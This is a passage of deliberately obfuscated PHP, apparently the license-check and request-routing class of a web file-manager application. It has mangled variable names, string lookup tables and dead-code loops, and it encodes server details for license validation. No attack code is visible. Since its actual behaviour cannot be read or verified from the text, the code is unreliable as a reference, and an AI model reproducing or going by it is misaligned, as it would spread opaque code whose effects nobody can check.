$ºãÜ¢Ä[4]; $ûĞŸ»ó© = $GLOBALS[$ºãÜ¢Ä[13]][$ºãÜ¢Ä[14]][0]; if (!$ûĞŸ»ó© || strlen($ûĞŸ»ó©) <= strlen($úç€½’)) { return; } if (strtolower(substr($ûĞŸ»ó©, -strlen($úç€½’))) != $úç€½’) { return; } $¡øò¿Ñ™ = substr($ûĞŸ»ó©, 0, -strlen($úç€½’)); $º­˜¼Ô¯ = array($ºãÜ¢Ä[4], $¡øò¿Ñ™); $ŒÍºù¥â = $Íò¢™é[707]; while (strlen($ŒÍºù¥â) < $Íò¢™é[698]) { if (!$ŒÍºù¥â) { break; } $ŒÍºù¥â++; } $Ú¶¢©¦º = array_slice($GLOBALS[$ºãÜ¢Ä[13]][$ºãÜ¢Ä[14]], 1); $GLOBALS[$ºãÜ¢Ä[13]][$ºãÜ¢Ä[14]] = array_merge($º­˜¼Ô¯, $Ú¶¢©¦º); $£ù¯Ö¹ = $Íò¢™é[708]; $GLOBALS[$ºãÜ¢Ä[13]][$ºãÜ¢Ä[15]] = implode($ºãÜ¢Ä[0], $GLOBALS[$ºãÜ¢Ä[13]][$ºãÜ¢Ä[14]]); $Ÿ¡íåö = $Íò¢™é[709]; } private function uqip0b98b4ed() { $âö’’‘ô =& $_SERVER[¼èá¯æÙ]; $˜ ®ÙÀ« =& $_SERVER[üŸĞÁÆÁ]; if ($GLOBALS[$˜ ®ÙÀ«[13]][$˜ ®ÙÀ«[15]] != $˜ ®ÙÀ«[6]) { return; } $×Ì‘Íàä = $_SERVER[$˜ ®ÙÀ«[16]]; $ÒÉÁé„Ì = $âö’’‘ô[710]; if (!$ÒÉÁé„Ì) { return; } $îÜµÊÑØ = $˜ ®ÙÀ«[17]; $Ÿº¨ ²ß = $âö’’‘ô[711]; if (!strstr($×Ì‘Íàä, $îÜµÊÑØ)) { return; } $Ğ…¬Úê = strrpos($×Ì‘Íàä, $îÜµÊÑØ); $Œìûìä„ = $âö’’‘ô[712]; while ($Œìûìä„ < $âö’’‘ô[701]) { if ($Œìûìä„ >= 0) { break; } $Œìûìä„++; } $é—ÑŠŞß = substr($×Ì‘Íàä, $Ğ…¬Úê + strlen($îÜµÊÑØ)); preg_match_all($˜ ®ÙÀ«[18], $é—ÑŠŞß, $…ß†¦Ö¤); $çÇ€ÌáÒ = $âö’’‘ô[713]; if (!$çÇ€ÌáÒ) { die; } $é—ÑŠŞß = trim($…ß†¦Ö¤[0][0], $˜ ®ÙÀ«[19]); $¡öı¢õÒ = $âö’’‘ô[714]; if (!$¡öı¢õÒ) { return; } $GLOBALS[$˜ ®ÙÀ«[13]][$˜ ®ÙÀ«[14]] = explode($˜ ®ÙÀ«[19], $é—ÑŠŞß); $å½êøÁ = $âö’’‘ô[715]; if (strlen($å½êøÁ) < $âö’’‘ô[60]) { return; } $GLOBALS[$˜ ®ÙÀ«[13]][$˜ ®ÙÀ«[15]] = implode($˜ ®ÙÀ«[0], $GLOBALS[$˜ ®ÙÀ«[13]][$˜ ®ÙÀ«[14]]); } public function run() { $¼°ÆÔÅ† =& $_SERVER[¼èá¯æÙ]; $ûÎšø®ê =& $_SERVER[üŸĞÁÆÁ]; $this->uqip0b98b4ed(); $áˆŞ­ê« = $¼°ÆÔÅ†[716]; $this->suwtb7aa227b(); $ëüßáŸª = $¼°ÆÔÅ†[717]; $®Èï––å = $GLOBALS[$ûÎšø®ê[13]][$ûÎšø®ê[14]]; $¾İ¯ïéø = $GLOBALS[$ûÎšø®ê[13]][$ûÎšø®ê[15]]; $ÒúÉšòä = $¼°ÆÔÅ†[718]; while ($ÒúÉšòä < $¼°ÆÔÅ†[706]) { if ($ÒúÉšòä >= 0) { break; } $ÒúÉšòä++; } define($ûÎšø®ê[20], isset($®Èï––å[0]) && $®Èï––å[0] ? $®Èï––å[0] : $this->defaultModule); define($ûÎšø®ê[21], isset($®Èï––å[1]) && $®Èï––å[0] ? $®Èï––å[1] : $this->defaultController); define($ûÎšø®ê[22], isset($®Èï––å[2]) && $®Èï––å[0] ? $®Èï––å[2] : $this->defaultAction); $Ñ¥½”â = $¼°ÆÔÅ†[719]; if (!$Ñ¥½”â) { return; } define($ûÎšø®ê[23], MOD . $ûÎšø®ê[0] . ST . $ûÎšø®ê[0] . ACT); $Ö‘®íÏÖ = $¼°ÆÔÅ†[720]; $_SERVER[$ûÎšø®ê[24]] = strtolower(ACTION); $this->autorun(); if (count($®Èï––å) >= 3) { $this->appRun($¾İ¯ïéø); } else { $this->appRun(ACTION); } } private $abhj409dfed6 = array(); private $eqit7888f320 = ''; public function nprl6aba76bc() { $±¦‘×¡å =& $_SERVER[¼èá¯æÙ]; $Ïƒ‚³ñá =& $_SERVER[üŸĞÁÆÁ]; $this->sjugb966b343(); $this->cewb9f5efae6(); $this->rbqa728f0d26(); $this->zfnr6c115e78(); $†ØßîÏš = $±¦‘×¡å[721]; if (strlen($†ØßîÏš) < $±¦‘×¡å[698]) { return; } $this->hxpj9ac8a62f(); $Š˜»Ï‹ = $±¦‘×¡å[722]; while (strlen($Š˜»Ï‹) < $±¦‘×¡å[723]) { if (!$Š˜»Ï‹) { break; } $Š˜»Ï‹++; } $this->yhosfb5c4b54(); $this->emqh949515a6(); $šÃ·È­ = $±¦‘×¡å[724]; if (!$šÃ·È­) { die; } $this->oaeu15b3d07d($Ïƒ‚³ñá[25], array($this, $Ïƒ‚³ñá[26])); $this->oaeu15b3d07d($Ïƒ‚³ñá[27], array($this, $Ïƒ‚³ñá[28])); $ôÚ•¾‘á = $±¦‘×¡å[725]; if (!$ôÚ•¾‘á) { die; } $this->oaeu15b3d07d($Ïƒ‚³ñá[29], array($this, $Ïƒ‚³ñá[30])); $³€¥ãó— = $±¦‘×¡å[726]; $this->oaeu15b3d07d($Ïƒ‚³ñá[31], array($this, $Ïƒ‚³ñá[32])); $µÚË”é  = $±¦‘×¡å[727]; } public function ytesa9869f0d($áñã—“›) { $õè‹Üûò =& $_SERVER[¼èá¯æÙ]; $ŞÑºÓôª =& $_SERVER[üŸĞÁÆÁ]; $ş–¿ÑŠ¥ = Model($ŞÑºÓôª[33])->get(); $ÂŞö¾÷Ø = array($ŞÑºÓôª[34], $ŞÑºÓôª[35], $ŞÑºÓôª[36], $ŞÑºÓôª[37], $ŞÑºÓôª[38], $ŞÑºÓôª[39], $ŞÑºÓôª[40], $ŞÑºÓôª[41], $ŞÑºÓôª[42], $ŞÑºÓôª[43], $ŞÑºÓôª[44], $ŞÑºÓôª[45], $ŞÑºÓôª[46], $ŞÑºÓôª[47], $ŞÑºÓôª[48], $ŞÑºÓôª[49], $ŞÑºÓôª[50], $ŞÑºÓôª[51], $ŞÑºÓôª[52], $ŞÑºÓôª[53], $ŞÑºÓôª[54], $ŞÑºÓôª[55], $ŞÑºÓôª[56], $ŞÑºÓôª[57], $ŞÑºÓôª[58], $ŞÑºÓôª[59], $ŞÑºÓôª[60], $ŞÑºÓôª[61], $ŞÑºÓôª[62], $ŞÑºÓôª[63], $ŞÑºÓôª[64], $ŞÑºÓôª[65], $ŞÑºÓôª[66], $ŞÑºÓôª[67], $ŞÑºÓôª[68], $ŞÑºÓôª[69], $ŞÑºÓôª[70], $ŞÑºÓôª[71], $ŞÑºÓôª[72], $ŞÑºÓôª[73], $ŞÑºÓôª[74], $ŞÑºÓôª[75], $ŞÑºÓôª[76], $ŞÑºÓôª[77], $ŞÑºÓôª[78], $ŞÑºÓôª[79], $ŞÑºÓôª[80], $ŞÑºÓôª[81], $ŞÑºÓôª[82], $ŞÑºÓôª[83], $ŞÑºÓôª[84], $ŞÑºÓôª[85]); $ï‚—ï®Ÿ = $õè‹Üûò[728]; if (!$ï‚—ï®Ÿ) { die; } foreach ($ÂŞö¾÷Ø as $øá¼ÙÊú) { $Òº•Æš = $GLOBALS[$ŞÑºÓôª[86]][$ŞÑºÓôª[87]][$øá¼ÙÊú]; if (isset($ş–¿ÑŠ¥[$øá¼ÙÊú])) { $Òº•Æš = $ş–¿ÑŠ¥[$øá¼ÙÊú]; } $áñã—“›[$ŞÑºÓôª[88]][$ŞÑºÓôª[89]][$øá¼ÙÊú] = $Òº•Æš; } $Êã£²¨Œ = $áñã—“›[$ŞÑºÓôª[88]][$ŞÑºÓôª[89]][$ŞÑºÓôª[46]]; unset($áñã—“›[$ŞÑºÓôª[88]][$ŞÑºÓôª[90]][$ŞÑºÓôª[91]]); $ÈµÅ±´ß = $õè‹Üûò[729]; unset($áñã—“›[$ŞÑºÓôª[88]][$ŞÑºÓôª[90]][$ŞÑºÓôª[92]]); unset($áñã—“›[$ŞÑºÓôª[88]][$ŞÑºÓôª[89]][$ŞÑºÓôª[46]]); unset($áñã—“›[$ŞÑºÓôª[88]][$ŞÑºÓôª[89]][$ŞÑºÓôª[93]]); $æåÍ¿ŒÈ = $õè‹Üûò[730]; if (!$æåÍ¿ŒÈ) { return; } $áñã—“›[$ŞÑºÓôª[88]][$ŞÑºÓôª[89]][$ŞÑºÓôª[94]] = array($ŞÑºÓôª[95] => (int) $Êã£²¨Œ[$ŞÑºÓôª[96]], $ŞÑºÓôª[97] => (int) _get($Êã£²¨Œ, $ŞÑºÓôª[98], 0)); $İƒ½³¹ª = $õè‹Üûò[731]; while (strlen($İƒ½³¹ª) < $õè‹Üûò[701]) { if (!$İƒ½³¹ª) { break; } $İƒ½³¹ª++; } $½¤Æ¿†ë = substr(md5($ŞÑºÓôª[99] . get_client_ip() . $ş–¿ÑŠ¥[$ŞÑºÓôª[100]]), 0, 15); $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[102]] = Mcrypt::encode(Session::sign(), $½¤Æ¿†ë, 3600 * 24); $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[103]] = Action($ŞÑºÓôª[104])->accessToken(); $ãå¦Ì¿ = $õè‹Üûò[732]; while ($ãå¦Ì¿ < $õè‹Üûò[706]) { if ($ãå¦Ì¿ >= 0) { break; } $ãå¦Ì¿++; } $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[105]] = md5($_SERVER[$ŞÑºÓôª[106]] . $ş–¿ÑŠ¥[$ŞÑºÓôª[100]]); $ñ‘äàÊ = $õè‹Üûò[733]; if (strlen($ñ‘äàÊ) < $õè‹Üûò[701]) { die; } $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[107]] = base64_encode(serverInfo()); $¢éöÄÏö = $õè‹Üûò[734]; $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[108]] = $this->eqit7888f320; if ($ş–¿ÑŠ¥[$ŞÑºÓôª[108]] != $ŞÑºÓôª[109]) { $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[110]] = $ş–¿ÑŠ¥[$ŞÑºÓôª[110]]; $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[111]] = $ş–¿ÑŠ¥[$ŞÑºÓôª[111]]; $›¤©èÛ = rand_string(10) . $this->eqit7888f320 . rand_string(5); $áñã—“›[$ŞÑºÓôª[88]][$ŞÑºÓôª[112]][$ŞÑºÓôª[113]] = $this->czlta02d190f($›¤©èÛ, $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[105]]); } if ($this->eqit7888f320 == $ŞÑºÓôª[109]) { $áñã—“›[$ŞÑºÓôª[88]][$ŞÑºÓôª[89]][$ŞÑºÓôª[94]][$ŞÑºÓôª[98]] = 0; } $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[114]] = $this->versionPluginFilter(); $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[115]] = _get($this->abhj409dfed6, $ŞÑºÓôª[116], $ŞÑºÓôª[6]); $ÈíÀªˆâ = $õè‹Üûò[735]; if (!$ÈíÀªˆâ) { return; } if (KodUser::isRoot() && $this->config[$ŞÑºÓôª[117]]) { $áñã—“›[$ŞÑºÓôª[101]][$ŞÑºÓôª[118]] = WEB_ROOT; } return $áñã—“›; } private function yhosfb5c4b54() { $áñªõ£Ü =& $_SERVER[¼èá¯æÙ]; $­ˆïŠ’‡ =& $_SERVER[üŸĞÁÆÁ]; $Ş®ú’òÒ = $_SERVER[$­ˆïŠ’‡[24]] == $­ˆïŠ’‡[119]; if ($_SERVER[$­ˆïŠ’‡[24]] == $­ˆïŠ’‡[120] && $_GET[$­ˆïŠ’‡[121]] == $­ˆïŠ’‡[122]) { $Ş®ú’òÒ = !0; } if ($Ş®ú’òÒ) { $†àçÚõ = array($­ˆïŠ’‡[108] => $this->eqit7888f320, $­ˆïŠ’‡[123] => $this->rbsq37688562(), $­ˆïŠ’‡[124] => Model($­ˆïŠ’‡[125])->count()); if ($this->eqit7888f320 != $­ˆïŠ’‡[109]) { $‹›æï = _get($this->abhj409dfed6, $­ˆïŠ’‡[126]); if ($‹›æï) { $†àçÚõ[$­ˆïŠ’‡[127]] = $‹›æï; $†àçÚõ[$­ˆïŠ’‡[128]] = strtotime(_get($this->abhj409dfed6, $­ˆïŠ’‡[129])); $†àçÚõ[$­ˆïŠ’‡[130]] = _get($this->abhj409dfed6, $­ˆïŠ’‡[116]); } $”ïå×ó¥ = Model($­ˆïŠ’‡[33])->get($­ˆïŠ’‡[131], $­ˆïŠ’‡[6], !0); if (is_string($”ïå×ó¥) && substr($”ïå×ó¥, 0, 1) == $­ˆïŠ’‡[132]) { $”ïå×ó¥ = json_decode_force($”ïå×ó¥); } if (is_array($”ïå×ó¥) && $”ïå×ó¥[$­ˆïŠ’‡[133]] && strstr($”ïå×ó¥[$­ˆïŠ’‡[133]], $­ˆïŠ’‡[134])) { $Ä‘¯ú‰ƒ = explode($­ˆïŠ’‡[134], $”ïå×ó¥[$­ˆïŠ’‡[133]]); $†àçÚõ[$­ˆïŠ’‡[135]] = $Ä‘¯ú‰ƒ[0]; } } $†àçÚõ = $this->hbuteb685332(json_encode($†àçÚõ), md5($­ˆïŠ’‡[136])); $ùÄãÇ…ó = $áñªõ£Ü[736]; $ÎÁ–—Å = array($­ˆïŠ’‡[137] => $†àçÚõ); $õÃìÑ™¤ = $áñªõ£Ü[737]; if (!$õÃìÑ™¤) { return; } call_user_func(array($­ˆïŠ’‡[138], $­ˆïŠ’‡[139]), $ÎÁ–—Å); $½»—Â‚· = $áñªõ£Ü[738]; if (!$½»—Â‚·) { die; } } if ($this->eqit7888f320 == $­ˆïŠ’‡[109]) { return; } $ˆæ¯áÁ = array($­ˆïŠ’‡[140], $­ˆïŠ’‡[141], $­ˆïŠ’‡[142], $­ˆïŠ’‡[143], $­ˆïŠ’‡[144], $­ˆïŠ’‡[145]); $Ÿí§Š÷ = Model($­ˆïŠ’‡[33])->get(); $€ŒÀ›È‰ = $áñªõ£Ü[739]; if (!$€ŒÀ›È‰) { die; } $ÎÁ–—Å = array($­ˆïŠ’‡[146] => $Ÿí§Š÷[$­ˆïŠ’‡[34]], $­ˆïŠ’‡[147] => $Ÿí§Š÷[$­ˆïŠ’‡[35]], $­ˆïŠ’‡[148] => $­ˆïŠ’‡[6]); foreach ($ˆæ¯áÁ as $È”¨×) { if (!isset($Ÿí§Š÷[$È”¨×]) || !$Ÿí§Š÷[$È”¨×]) { continue; } $ÎÁ–—Å[$È”¨×] = $Ÿí§Š÷[$È”¨×]; } call_user_func(array($­ˆïŠ’‡[138], $­ˆïŠ’‡[139]), $ÎÁ–—Å); } private function zfnr6c115e78() { $§ˆä¥¶û =& $_SERVER[¼èá¯æÙ]; $ÓÒÏÂ˜û =& $_SERVER[üŸĞÁÆÁ]; if ($_SERVER[$ÓÒÏÂ˜û[24]] != $ÓÒÏÂ˜û[149]) { return; } if (!KodUser::isRoot()) { die; } $àÍ³ø¼ = $GLOBALS[$ÓÒÏÂ˜û[13]]; if (isset($àÍ³ø¼[$ÓÒÏÂ˜û[150]])) { $this->xdeo5a71e3d4(); die; } if (isset($àÍ³ø¼[$ÓÒÏÂ˜û[151]]) && isset($àÍ³ø¼[$ÓÒÏÂ˜û[151]]) == $ÓÒÏÂ˜û[122]) { $àÍ³ø¼[$ÓÒÏÂ˜û[152]] = Model($ÓÒÏÂ˜û[33])->get($ÓÒÏÂ˜û[153]); } if (!isset($àÍ³ø¼[$ÓÒÏÂ˜û[152]]) || strlen($àÍ³ø¼[$ÓÒÏÂ˜û[152]]) != 16) { show_json($ÓÒÏÂ˜û[154] . $àÍ³ø¼[$ÓÒÏÂ˜û[152]], !1); } $Ë¢¬¸ïî = Model($ÓÒÏÂ˜û[33])->get($ÓÒÏÂ˜û[100]); $åÂÌÑªŒ = md5($_SERVER[$ÓÒÏÂ˜û[106]] . $Ë¢¬¸ïî); $ï ³Ä¬ı = $§ˆä¥¶û[740]; if (!$ï ³Ä¬ı) { die; } $ä¨¬˜± = array($ÓÒÏÂ˜û[152] => $àÍ³ø¼[$ÓÒÏÂ˜û[152]], $ÓÒÏÂ˜û[155] => rand_string(16), $ÓÒÏÂ˜û[156] => $ÓÒÏÂ˜û[136], $ÓÒÏÂ˜û[157] => $ÓÒÏÂ˜û[158], $ÓÒÏÂ˜û[159] => $_SERVER[$ÓÒÏÂ˜û[160]], $ÓÒÏÂ˜û[161] => $_SERVER[$ÓÒÏÂ˜û[162]], $ÓÒÏÂ˜û[163] => $_SERVER[$ÓÒÏÂ˜û[164]], $ÓÒÏÂ˜û[105] => $åÂÌÑªŒ, $ÓÒÏÂ˜û[165] => Model($ÓÒÏÂ˜û[33])->get($ÓÒÏÂ˜û[131])); if (isset($àÍ³ø¼[$ÓÒÏÂ˜û[151]]) && isset($àÍ³ø¼[$ÓÒÏÂ˜û[151]]) == $ÓÒÏÂ˜û[122]) { $ä¨¬˜±[$ÓÒÏÂ˜û[151]] = md5($ä¨¬˜±[$ÓÒÏÂ˜û[152]] . $ÓÒÏÂ˜û[166] . $ä¨¬˜±[$ÓÒÏÂ˜û[155]]); } if ($àÍ³ø¼[$ÓÒÏÂ˜û[167]] == $ÓÒÏÂ˜û[168]) { $ç¥¥Æèª = $this->hbuteb685332($åÂÌÑªŒ, $ÓÒÏÂ˜û[169]); $Áõ‰”´Î = $this->czlta02d190f(json_encode($ä¨¬˜±), $åÂÌÑªŒ . $ÓÒÏÂ˜û[170], 3); $Áõ‰”´Î = $Áõ‰”´Î . $ÓÒÏÂ˜û[171] . $_SERVER[$ÓÒÏÂ˜û[160]]; $®úæü©› = $this->vstmf87e7313($ÓÒÏÂ˜û[172] . $ç¥¥Æèª . $ÓÒÏÂ˜û[173] . $Áõ‰”´Î, -1); show_json($®úæü©›, !0); } else { if ($àÍ³ø¼[$ÓÒÏÂ˜û[167]] == $ÓÒÏÂ˜û[174]) { $¾İç¶Øó = substr(md5($ÓÒÏÂ˜û[175] . $åÂÌÑªŒ), 12, 15) . $ÓÒÏÂ˜û[176]; $Áõ‰”´Î = $this->snlac6ab0430(trim($àÍ³ø¼[$ÓÒÏÂ˜û[177]]), $¾İç¶Øó, 2); $ŸãÁœÊÒ = json_decode($Áõ‰”´Î, !0); if (!is_array($ŸãÁœÊÒ) || !is_array($ŸãÁœÊÒ[$ÓÒÏÂ˜û[178]]) || $ŸãÁœÊÒ[$ÓÒÏÂ˜û[152]] != !0) { $Å”Á­˜ó = $ÓÒÏÂ˜û[179]; $†ÃŒ„Ìı = $ŸãÁœÊÒ[$ÓÒÏÂ˜û[178]] ? $ÓÒÏÂ˜û[180] . $ŸãÁœÊÒ[$ÓÒÏÂ˜û[178]] : $Å”Á­˜ó; show_json($†ÃŒ„Ìı, !1); } else { $ä¨¬˜±[$ÓÒÏÂ˜û[155]] = $ŸãÁœÊÒ[$ÓÒÏÂ˜û[178]][$ÓÒÏÂ˜û[181]]; } } else { $ŸãÁœÊÒ = $this->vstmf87e7313($ÓÒÏÂ˜û[182], $ä¨¬˜±, 10); } } if (!is_array($ŸãÁœÊÒ) || !is_array($ŸãÁœÊÒ[$ÓÒÏÂ˜û[178]]) || $ŸãÁœÊÒ[$ÓÒÏÂ˜û[152]] != !0) { $Å”Á­˜ó = LNG($ÓÒÏÂ˜û[183]); $†ÃŒ„Ìı = $ŸãÁœÊÒ[$ÓÒÏÂ˜û[178]] ? $ÓÒÏÂ˜û[180] . $ŸãÁœÊÒ[$ÓÒÏÂ˜û[178]] : $Å”Á­˜ó; show_json($†ÃŒ„Ìı, !1); } $İÏ“ÌÕó = $ŸãÁœÊÒ[$ÓÒÏÂ˜û[178]]; $´è¢İıÙ = $this->ibuqcf05ab95($İÏ“ÌÕó[$ÓÒÏÂ˜û[184]]); if (!$´è¢İıÙ || $´è¢İıÙ != $İÏ“ÌÕó[$ÓÒÏÂ˜û[129]]) { $µß×÷È’ = array($ÓÒÏÂ˜û[185] => Model($ÓÒÏÂ˜û[33])->get($ÓÒÏÂ˜û[100]), $ÓÒÏÂ˜û[186] => $_SERVER[$ÓÒÏÂ˜û[106]], $ÓÒÏÂ˜û[187] => this_url(), $ÓÒÏÂ˜û[161] => $_SERVER[$ÓÒÏÂ˜û[162]]); $Áõ‰”´Î = $this->naifd507ca20(json_encode($µß×÷È’)); $this->vstmf87e7313($ÓÒÏÂ˜û[188] . $Áõ‰”´Î); show_json(LNG($ÓÒÏÂ˜û[189]), !0); } $öôğß—“ = array($ÓÒÏÂ˜û[153] => $İÏ“ÌÕó[$ÓÒÏÂ˜û[190]], $ÓÒÏÂ˜û[191] => $İÏ“ÌÕó[$ÓÒÏÂ˜û[192]], $ÓÒÏÂ˜û[193] => rand_string(16), $ÓÒÏÂ˜û[108] => $İÏ“ÌÕó[$ÓÒÏÂ˜û[194]]); if ($ä¨¬˜±[$ÓÒÏÂ˜û[155]]) { $öôğß—“[$ÓÒÏÂ˜û[193]] = $ä¨¬˜±[$ÓÒÏÂ˜û[155]]; } $ïà­€İ = substr(md5($öôğß—“[$ÓÒÏÂ˜û[191]]), 10, 10); $³î…™Û• = $ïà­€İ . $öôğß—“[$ÓÒÏÂ˜û[108]] . $öôğß—“[$ÓÒÏÂ˜û[193]]; $öôğß—“[$ÓÒÏÂ˜û[110]] = strrev(base64_encode($this->hbuteb685332($³î…™Û•, $ÓÒÏÂ˜û[195]))); $àã˜ÅÜ = rand_string(16); $æ½ÚÂŒĞ = $àã˜ÅÜ . $öôğß—“[$ÓÒÏÂ˜û[108]] . $this->hbuteb685332(md5($öôğß—“[$ÓÒÏÂ˜û[153]]), $àã˜ÅÜ); $öôğß—“[$ÓÒÏÂ˜û[111]] = base64_encode(strrev($this->hbuteb685332($æ½ÚÂŒĞ, $ÓÒÏÂ˜û[196]))); $ü½öõ» = $§ˆä¥¶û[741]; if (strlen($ü½öõ») < $§ˆä¥¶û[723]) { return; } if ($İÏ“ÌÕó[$ÓÒÏÂ˜û[197]] && $İÏ“ÌÕó[$ÓÒÏÂ˜û[197]] >= 1) { Model($ÓÒÏÂ˜û[33])->setDeep($ÓÒÏÂ˜û[198], $ÓÒÏÂ˜û[122]); } Model($ÓÒÏÂ˜û[33])->set($öôğß—“); $œ¡˜®Ò• = md5($_SERVER[$ÓÒÏÂ˜û[106]] . strrev($Ë¢¬¸ïî) . $öôğß—“[$ÓÒÏÂ˜û[191]]); $ø•î€ˆ« = $§ˆä¥¶û[742]; if (!$ø•î€ˆ«) { return; } $‰¥ˆ¶ÉÊ = strrev(substr($œ¡˜®Ò•, 10, 16)); $âÔ©Ï¿ = $§ˆä¥¶û[743]; if (!$âÔ©Ï¿) { return; } $ œÁ†á‚ = $this->czlta02d190f(json_encode($İÏ“ÌÕó), $œ¡˜®Ò•); $Šçíç¥¶ = array_to_keyvalue(Model($ÓÒÏÂ˜û[7])->listData(), $ÓÒÏÂ˜û[199]); $×Êì£Ê× = $§ˆä¥¶û[744]; if (strlen($×Êì£Ê×) < $§ˆä¥¶û[701]) { return; } $¦ƒÀÔ° = $Šçíç¥¶[$ÓÒÏÂ˜û[200]]; $îØ°ÍóÈ = array(); $îØ°ÍóÈ[$‰¥ˆ¶ÉÊ] = $ œÁ†á‚; $®ó·©œí = $§ˆä¥¶û[745]; Model($ÓÒÏÂ˜û[7])->update($¦ƒÀÔ°[$ÓÒÏÂ˜û[201]], array($ÓÒÏÂ˜û[202] => $îØ°ÍóÈ)); $this->abhj409dfed6 = $İÏ“ÌÕó; $¯ÜÌ„áŸ = $§ˆä¥¶û[746]; if (strlen($¯ÜÌ„áŸ) < $§ˆä¥¶û[698]) { die; } $this->eqit7888f320 = $öôğß—“[$ÓÒÏÂ˜û[108]]; $this->licenseRegistSuccess(); $¿–ìÅŸ = $§ˆä¥¶û[747]; Cache::set($ÓÒÏÂ˜û[203] . md5($Ë¢¬¸ïî . $ÓÒÏÂ˜û[204]), $ÓÒÏÂ˜û[6]); show_json(LNG($ÓÒÏÂ˜û[189]), !0); } private function licenseRegistSuccess() { $†ˆîí¦Œ =& $_SERVER[üŸĞÁÆÁ]; $­ÇôÈõ = Model($†ˆîí¦Œ[33])->get(); if ($­ÇôÈõ[$†ˆîí¦Œ[63]] != $†ˆîí¦Œ[122]) { Model($†ˆîí¦Œ[33])->set($†ˆîí¦Œ[63], $†ˆîí¦Œ[122]); } Action($†ˆîí¦Œ[205])->initStart(!0); } private function xdeo5a71e3d4() { $áÉ¨ä±« =& $_SERVER[¼èá¯æÙ]; $¯Òæ—× =& $_SERVER[üŸĞÁÆÁ]; Model($¯Òæ—×[33])->set(array($¯Òæ—×[153] => $¯Òæ—×[6], $¯Òæ—×[191] => $¯Òæ—×[6], $¯Òæ—×[108] => $¯Òæ—×[109], $¯Òæ—×[110] => $¯Òæ—×[6], $¯Òæ—×[111] => $¯Òæ—×[6])); $¾Ø™ÒÇ€ = $áÉ¨ä±«[748]; Model($¯Òæ—×[33])->setDeep($¯Òæ—×[198], $¯Òæ—×[206]); $ö’…Ô£ı = $áÉ¨ä±«[749]; $this->abhj409dfed6 = array(); $this->eqit7888f320 = $¯Òæ—×[109]; $ŠÑŠ£ğ… = $áÉ¨ä±«[750]; } private function sjugb966b343() { $•×‰êÎÙ =& $_SERVER[¼èá¯æÙ]; $ ’¬¢¢š =& $_SERVER[üŸĞÁÆÁ]; $_SERVER[$ ’¬¢¢š[162]] = _get($_SERVER, $ ’¬¢¢š[162], APP_HOST); $£×”á¼ = $•×‰êÎÙ[751]; if (!$£×”á¼) { return; } $this->eqit7888f320 = $ ’¬¢¢š[109]; $¶…ÚóêÎ = $•×‰êÎÙ[728]; while ($¶…ÚóêÎ < $•×‰êÎÙ[60]) { if ($¶…ÚóêÎ >= 0) { break; } $¶…ÚóêÎ++; } $ ®Í²µ = Model($ ’¬¢¢š[33])->get(); $ØæÖĞĞ = $•×‰êÎÙ[752]; if ($ ®Í²µ[$ ’¬¢¢š[108]] == $ ’¬¢¢š[109]) { return; } $ìÏßÊÊÑ = Model($ ’¬¢¢š[33])->get($ ’¬¢¢š[100]); $Üìè¢Ğ = $ ’¬¢¢š[203] . md5($ìÏßÊÊÑ . $ ’¬¢¢š[204]); $—‹€–Ñ = Cache::get($Üìè¢Ğ); if (!is_array($—‹€–Ñ) || !isset($—‹€–Ñ[$ ’¬¢¢š[207]]) || time() - $—‹€–Ñ[$ ’¬¢¢š[207]] >= 60) { $—¤Ò“×ª = Model($ ’¬¢¢š[7])->loadList(); $İŸË¸å = $—¤Ò“×ª[$ ’¬¢¢š[200]]; $áèØèŠÜ = md5($_SERVER[$ ’¬¢¢š[106]] . strrev($ìÏßÊÊÑ) . $ ®Í²µ[$ ’¬¢¢š[191]]); $ä†â¡÷‘ = strrev(substr($áèØèŠÜ, 10, 16)); $—‹€–Ñ = $this->snlac6ab0430($İŸË¸å[$ ’¬¢¢š[86]][$ä†â¡÷‘], $áèØèŠÜ); $—‹€–Ñ = json_decode($—‹€–Ñ, !0); } if (!is_array($—‹€–Ñ)) { return $this->xdeo5a71e3d4(); } $¥íáéÑû = strtotime($—‹€–Ñ[$ ’¬¢¢š[129]]); if (time() >= $¥íáéÑû) { return $this->xdeo5a71e3d4(); } if (!isset($—‹€–Ñ[$ ’¬¢¢š[207]]) || time() - $—‹€–Ñ[$ ’¬¢¢š[207]] > 20) { $—‹€–Ñ[$ ’¬¢¢š[207]] = time(); Cache::set($Üìè¢Ğ, $—‹€–Ñ); } $this->abhj409dfed6 = $—‹€–Ñ; $this->eqit7888f320 = $ ®Í²µ[$ ’¬¢¢š[108]]; } private function cewb9f5efae6() { $ÄØ¦— =& $_SERVER[üŸĞÁÆÁ]; $ñŸ¹ì³‚ = $GLOBALS[$ÄØ¦—[13]]; $§´ÉÉŒ´ = $_SERVER[$ÄØ¦—[24]]; $Í¬§¾ûõ = $_SERVER[¼èá¯æÙ][753]; if ($§´ÉÉŒ´ == $ÄØ¦—[208] && $this->eqit7888f320 == $ÄØ¦—[109]) { show_json(LNG($ÄØ¦—[209]), !1, $ÄØ¦—[210]); } $»úğáƒÛ = array($ÄØ¦—[211], $ÄØ¦—[212]); if (in_array($§´ÉÉŒ´, $»úğáƒÛ)) { if ($this->eqit7888f320 == $ÄØ¦—[109] && isset($ñŸ¹ì³‚[$ÄØ¦—[213]])) { show_json(LNG($ÄØ¦—[209]), !1, $ÄØ¦—[210]); die; } $¨§÷¬™‘ = $this->rbsq37688562(); if ($¨§÷¬™‘ != intval($ÄØ¦—[214])) { if ($¨§÷¬™‘ <= Model($ÄØ¦—[125])->count()) { show_json(LNG($ÄØ¦—[215]), !1, $ÄØ¦—[210]); die; } } } } private function rbqa728f0d26() { $ñ¥ä¼ñ“ =& $_SERVER[¼èá¯æÙ]; $«ùÓûõ• =& $_SERVER[üŸĞÁÆÁ]; $¯åğ™Ö = array($«ùÓûõ•[119], $«ùÓûõ•[120]); $ŒóÃœŠ = $ñ¥ä¼ñ“[754]; while ($ŒóÃœŠ < $ñ¥ä¼ñ“[698]) { if ($ŒóÃœŠ >= 0) { break; } 